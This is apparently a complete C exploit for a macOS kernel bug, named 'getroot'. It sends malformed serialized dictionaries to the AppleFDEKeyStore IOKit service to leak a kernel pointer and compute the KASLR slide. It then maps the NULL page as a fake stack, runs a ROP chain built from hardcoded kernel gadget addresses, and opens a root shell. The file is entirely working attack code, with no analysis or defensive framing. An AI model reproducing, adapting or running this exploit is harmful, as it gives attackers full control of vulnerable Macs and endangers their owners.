#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

// Compile: clang getroot.c -framework IOKit -m32 -pagezero_size,0 -o getroot

enum {
	kOSSerializeDictionary = 0x01000000U,
	kOSSerializeArray = 0x02000000U,
	kOSSerializeSet = 0x03000000U,
	kOSSerializeNumber = 0x04000000U,
	kOSSerializeSymbol = 0x08000000U,
	kOSSerializeString = 0x09000000U,
	kOSSerializeData = 0x0a000000U,
	kOSSerializeBoolean = 0x0b000000U,
	kOSSerializeObject = 0x0c000000U,
	kOSSerializeTypeMask = 0x7F000000U,
	kOSSerializeDataMask = 0x00FFFFFFU,
	kOSSerializeEndCollection = 0x80000000U,
};

uint64_t kslide = 0;

void g3t_r00t() {
	kern_return_t kr = 0;
	kern_return_t res = 0;
	mach_port_t master = MACH_PORT_NULL;

	io_connect_t connect;
	CFDictionaryRef matching_dict = IOServiceMatching("AppleFDEKeyStore");
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching_dict);

	printf("[*] opened service\n");

	uint32_t dict[] = {
	    0x000000d3,
	    kOSSerializeDictionary | kOSSerializeEndCollection | 0x6,
	    kOSSerializeString | 0x4,
	    0x00414141,
	    kOSSerializeBoolean | 0x1,
	    kOSSerializeSymbol | 0x4,
	    0x00424242,
	    kOSSerializeData | 32,
	    0, 0, 0, 0,
	    0, 0, 0, 0,
	    kOSSerializeSymbol | 0x4,
	    0x00434343,
	    kOSSerializeObject | 0x1 | kOSSerializeEndCollection  // 0x1 -> len = 1 -> ref to object 1
	};

	uint64_t rop_chain[] = {
	    0xffffff8000835400 + kslide,
	    0xffffff80002b8a26 + kslide,
	    0xffffff800030e6dc + kslide,
	    0xffffff80008551c6 + kslide,
	    0xdeadbeefdeadbeef,
	    0xffffff80007a61c0 + kslide,
	    0xffffff80002b8a26 + kslide,
	    0xffffff800030e6dc + kslide,
	    0xffffff80008551c6 + kslide,
	    0xdeadbeefdeadbeef,
	    0xffffff800077a7e0 + kslide,
	    0xffffff80002b8a26 + kslide,
	    0xffffff800030e6dc + kslide,
	    0xffffff80008551c6 + kslide,
	    0xdeadbeefdeadbeef,
	    0xffffff80003a1b7e + kslide,
	    0x000000000000000c,
	    0xffffff800010e140 + kslide,
	    0xffffff80003c7e4a + kslide
	};

	uint64_t *stk = (uint64_t *)0x0;
	stk[0] = 0xffffff8000425870 + kslide;
	stk[1] = (uint64_t)rop_chain;
	stk[2] = 0;
	stk[3] = 0;
	stk[4] = 0xffffff80002b924f + kslide;

	kr = io_service_open_extended(
	    service,
	    mach_task_self(),
	    0,
	    NDR_record,
	    (io_buf_ptr_t)dict,
	    sizeof(uint32_t) * 19,
	    &res,
	    &connect
	);

	if (getuid() == 0) {
		printf("[+] g0t r00t!\n");
		system("/bin/bash");
		return;
	}

	printf("[!] failed\n");
}

int main(int argc, const char *argv[]) {
	setbuf(stdout, 0x0);

	kern_return_t kr, res;
	io_connect_t connect;
	CFDictionaryRef matching_dict = IOServiceMatching("AppleFDEKeyStore");
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching_dict);
	const mach_msg_type_number_t size = 4096;

	mach_vm_address_t np = 0;
	vm_deallocate(mach_task_self(), 0, 0x1000);

	kr = mach_vm_allocate(mach_task_self(), (mach_vm_address_t *)&np, 0x1000, 0);
	printf("[*] np = 0x%llx\n", np);
	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to allocate\n");
		exit(-1);
	}
	printf("[+] mapped address\n");
	uint32_t dict[] = {
	    0x000000d3,
	    kOSSerializeEndCollection | kOSSerializeDictionary | 0x2,
	    kOSSerializeString | 0x4,
	    0x00414141,
	    kOSSerializeEndCollection | kOSSerializeNumber | size,
	    0x41414141,
	    0x41414141
	};

	char buffer[size] = {0};
	io_name_t name = "AAA";
	io_iterator_t iter;

	kr = io_service_open_extended(
	    service,
	    mach_task_self(),
	    0,
	    NDR_record,
	    (io_buf_ptr_t)dict,
	    sizeof(uint32_t) * 7,
	    &res,
	    &connect
	);

	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to open service\n");
		exit(-1);
	}

	IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
	io_object_t object = IOIteratorNext(iter);

	kr = io_registry_entry_get_property_bytes(object, name, buffer, (mach_msg_type_number_t *)&size);

	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to get property values\n");
		exit(-1);
	}

	printf("[+] leak kernel info\n");
	printf("[+] get kernel stack pointer 0x%llx\n", *(uint64_t *)(buffer + 7 * sizeof(uint64_t)));
	printf("[+] get kernel slide 0x%llx\n", *(uint64_t *)(buffer + 7 * sizeof(uint64_t)) - 0xFFFFFF80003934BF);
	kslide = *(uint64_t *)(buffer + 7 * sizeof(uint64_t)) - 0xFFFFFF80003934BF;

	g3t_r00t();

	return 0;
}
